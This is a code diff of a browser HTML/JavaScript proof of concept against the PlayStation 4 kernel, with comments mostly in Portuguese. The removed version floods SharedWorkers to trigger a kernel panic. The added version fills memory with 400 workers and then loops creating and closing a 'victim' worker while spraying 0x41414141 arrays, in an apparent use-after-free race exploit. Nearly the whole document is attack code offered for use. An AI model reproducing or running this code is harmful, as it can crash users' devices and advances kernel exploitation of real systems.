@@ -2,80 +2,102 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Kernel Resource Exhaustion PoC</title>
+    <title>PS4 Kernel Stress & Race PoC</title>
 </head>
 <body>
 
-    <h1>SharedWorker Kernel Panic PoC</h1>
-    
-    <p>Target limit > 400 Safe.</p>
-    <p>Target limit > 401-405 triggers Freeze.</p>
-    <p>Target limit > 405+ Starts Kernel Panic.</p>
+    <h1>Kernel Grooming & Race Exploit</h1>
+    <p>Strategy: Fill to 400 (Lag Zone) -> Attempt UAF Race</p>
 
-    <label>
-        Workers Target: <input type="number" id="count" value="600">
-    </label>
-    <button onclick="run()">TRIGGER PANIC</button>
+    <div id="status">Status: Idle</div>
+    <div id="log">Logs:<br></div>
 
-    <div id="log">Ready.<br></div>
+    <button onclick="startExploit()">START STRESS + RACE</button>
 
     <script>
-        // Array to keep workers alive (prevent GC and force Kernel allocation)
-        let keeps = [];
+        // CONFIGURAÇÃO
+        const FILL_TARGET = 400; // O ponto logo antes do lag extremo
+        const SPRAY_SIZE = 1024 * 64; // Tamanho do chunk
+        
+        let fillers = [];
+        let raceInterval;
 
         function log(msg) {
-            const el = document.getElementById('log');
-            el.innerHTML = `> ${msg}<br>` + el.innerHTML;
+            document.getElementById('log').innerHTML = `> ${msg}<br>` + document.getElementById('log').innerHTML;
         }
 
-        function run() {
-            const limit = parseInt(document.getElementById('count').value);
-            log(`Allocating ${limit} SharedWorkers...`);
-            log("System instability expected around 400.");
-            log("Kernel Panic expected above 405.");
+        function updateStatus(msg) {
+            document.getElementById('status').innerText = "Status: " + msg;
+        }
 
-            if (!window.SharedWorker) return log("SharedWorker API not supported.");
+        async function startExploit() {
+            if (!window.SharedWorker) return log("SharedWorker not supported.");
 
-            let created = 0;
+            // FASE 1: ENCHER A MEMÓRIA (PREPARAR O TERRENO)
+            updateStatus("Filling Memory...");
+            log(`Alocando ${FILL_TARGET} workers de base...`);
             
-            // Fast interval to flood the kernel allocator
-            const interval = setInterval(() => {
-                // Batch creation to speed up the process
-                for (let i = 0; i < 5; i++) {
-                    try {
-                        // Using a unique name (timestamp + counter) forces the Kernel 
-                        // to create a new IPC handle/process structure for each worker.
-                        const id = "kpanic_" + Date.now() + "_" + created;
-                        
-                        // Create and hold reference
-                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", id);
-                        sw.port.start(); // Ensure port is active and handle is allocated
-                        keeps.push(sw);
-                        
-                        created++;
-
-                        if (created >= limit) {
-                            clearInterval(interval);
-                            log(`Limit reached (${limit}). Waiting for system crash...`);
-                            return;
-                        }
-
-                    } catch (e) {
-                        // If the browser catches the error, log it.
-                        // However, the Kernel usually panics before this catch block triggers.
-                        clearInterval(interval);
-                        log(`Alloc Error at ${created}: ${e.message}`);
+            let count = 0;
+            const fillLoop = setInterval(() => {
+                for(let i=0; i<5; i++) {
+                    if (count >= FILL_TARGET) {
+                        clearInterval(fillLoop);
+                        log("Base alocada. O sistema deve estar levemente lento.");
+                        setTimeout(startRacePhase, 1000); // Pausa para estabilizar
                         return;
                     }
+                    try {
+                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", "fill_" + count);
+                        sw.port.start();
+                        fillers.push(sw);
+                        count++;
+                    } catch(e) {
+                        clearInterval(fillLoop);
+                        log("Erro no Filler: " + e.message);
+                    }
                 }
-                
-                // Update log every 50 creations to avoid UI lag interfering with the test
-                if (created % 50 === 0) log(`Active: ${created}...`);
-
-            }, 5);
+            }, 10);
         }
+
+        function startRacePhase() {
+            updateStatus("RACING (UAF Attempt)");
+            log("Iniciando Race Condition em ambiente estressado...");
+            log("Tentando alocar/liberar o slot 401 repetidamente...");
+
+            let cycle = 0;
+            
+            // FASE 2: O LOOP DE CORRIDA (Create -> Close -> Spray)
+            raceInterval = setInterval(() => {
+                cycle++;
+                
+                // 1. Cria o worker "Vítima" (O número 401)
+                let victim;
+                try {
+                    victim = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", "victim_" + cycle);
+                    victim.port.start();
+                } catch(e) {
+                    // Se falhar a criação, o kernel tá cheio demais. Tentamos de novo.
+                    return;
+                }
+
+                // 2. O GOLPE: Fecha e Spray quase simultâneo
+                // Como o sistema está com lag (pelos 400 workers), o Kernel demora para processar o close.
+                victim.port.close();
+                victim = null; // Remove referência JS
+
+                // 3. Spray Imediato
+                // Tentamos colocar 0x41414141 no lugar onde o worker 401 estava
+                try {
+                    const spray = new Uint32Array(SPRAY_SIZE).fill(0x41414141);
+                    // Não guardamos referência do spray para não estourar RAM, 
+                    // queremos apenas que ele passe pela memória do Kernel.
+                } catch(e) {}
+
+                if (cycle % 100 === 0) log(`Race Cycles: ${cycle}`);
+
+            }, 50); // Intervalo controlado
+        }
+
     </script>
 </body>
 </html>
-
-
